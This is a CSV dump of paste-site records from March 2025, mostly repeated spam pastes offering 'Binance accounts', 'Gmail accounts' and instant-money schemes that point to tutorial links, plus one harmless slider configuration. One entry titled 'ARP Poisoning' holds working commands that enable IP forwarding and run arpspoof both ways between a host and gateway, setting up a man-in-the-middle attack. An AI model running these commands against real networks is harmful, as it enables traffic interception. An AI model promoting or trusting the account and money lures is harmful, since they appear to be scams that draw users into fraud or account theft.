id,title,username,language,date,content
T1wB72vG,Random Gmail Acc MO,jakenon1,JavaScript,Monday 17th of March 2025 12:47:06 PM CDT," 
 
Tutorial: https://pastebin.com/wwbTvVb7

Enjoy
 
GzmRCgcnwg
"
eLAsQ11x,ARP Poisoning,infologica,Bash,Monday 17th of March 2025 12:46:58 PM CDT,"echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof 192.168.3.114 -t 192.168.3.1
arpspoof 192.168.3.1 -t 192.168.3.114
"
hBna00cg,Make $1000 15-MINUTES (BEGINNER) AG,Mosa309,JavaScript,Monday 17th of March 2025 12:46:12 PM CDT," 
 
Tutorial: https://pastebin.com/zQ9kQngQ

Enjoy
 
nQh6rmR5i9
"
fP7yKeK0,vertical slider (nestable slider on Bricks Builder),dizplay,JSON,Monday 17th of March 2025 12:46:09 PM CDT,"{
 ""type"":""loop"",
 ""drag"": true,
 ""direction"":""ttb"",
 ""keyboard"":""global"",
 ""height"":""fit-content"",
 ""gap"":""0px"",
 ""start"":""0"",
 ""perPage"":1,
 ""perMove"":1,
 ""speed"": ""1400"",
 ""easing"": ""cubic-bezier(0.455, 0.030, 0.515, 0.955)"",
 ""interval"":7000,
 ""autoHeight"":true,
 ""autoplay"":true,
 ""pauseOnHover"":true,
 ""pauseOnFocus"":false,
""arrows"":true,
 ""arrowPath"" : ""M35.1,21.3L23.8,32.6c-0.7,0.7-1.9,0.7-2.7,0c-0.7-0.7-0.7-1.9,0-2.7l8.1-8.1h-23c-1,0-1.9-0.8-1.9-1.9c0-1,0.8-1.9,1.9-1.9 h23l-8.1-8.1c-0.7-0.7-0.7-1.9,0-2.7c0.7-0.7,1.9-0.7,2.7,0l11.3,11.3C35.8,19.4,35.9,20.6,35.1,21.3C35.1,21.3,35.1,21.3,35.1,21.3"",
 ""pagination"":false,
 ""mediaQuery"":""max"",
 ""padding"": ""0"",
 ""classes"": {
 ""arrows"": ""splide-freccie"",
 ""arrow"": ""splide-freccia"",
 ""prev"": ""splide-sx"",
 ""next"": ""splide-dx""
 },
 ""breakpoints"": {
 ""767"": {
 ""direction"":""ltr"",
 ""autoHeight"":true,
 ""easing"": ""cubic-bezier(0.250, 0.460, 0.450, 0.940)"",
 ""speed"": ""700""
 }
 }
}
"
ndMTVB4X,Binance account DJ,jakenon1,JavaScript,Monday 17th of March 2025 12:45:53 PM CDT," 
 
Tutorial: https://pastebin.com/wwbTvVb7

Enjoy
 
AJXhVy7IMO
"
rZby574D,Binance account PZ,Mosa309,JavaScript,Monday 17th of March 2025 12:45:07 PM CDT," 
 
Tutorial: https://pastebin.com/zQ9kQngQ

Enjoy
 
tXjVvFm3Jm
"
k5jrnNnr,EARN $900 INSTANTLY 2025 SR,jakenon1,JavaScript,Monday 17th of March 2025 12:44:47 PM CDT," 
 
Tutorial: https://pastebin.com/wwbTvVb7

Enjoy
 
QhKbflelzL
"
k9SLVDUv,EARN $900 INSTANTLY 2025 6G,Mosa309,JavaScript,Monday 17th of March 2025 12:44:02 PM CDT," 
 
Tutorial: https://pastebin.com/zQ9kQngQ

Enjoy
 
YEup00u9Mf
"
zf3KgXEt,Random Gmail Acc MO,jakenon1,JavaScript,Monday 17th of March 2025 12:43:42 PM CDT," 
 
Tutorial: https://pastebin.com/wwbTvVb7

Enjoy
 
VLWsexudG8
"
0yBcDsUX,Make $1000 15-MINUTES (BEGINNER) AG,Mosa309,JavaScript,Monday 17th of March 2025 12:42:52 PM CDT," 
 
Tutorial: https://pastebin.com/zQ9kQngQ

Enjoy
 
ZuzG5iGtQ4
"
5aAhN6Hw,Make $1000 15-MINUTES (BEGINNER) TB,jakenon1,JavaScript,Monday 17th of March 2025 12:42:36 PM CDT," 
 
Tutorial: https://pastebin.com/wwbTvVb7

Enjoy
 
tJE6dmsEqM
"
qaw004Bc,Binance account PZ,Mosa309,JavaScript,Monday 17th of March 2025 12:41:48 PM CDT," 
 
Tutorial: https://pastebin.com/zQ9kQngQ

Enjoy
 
AIsxXZF1uD
"
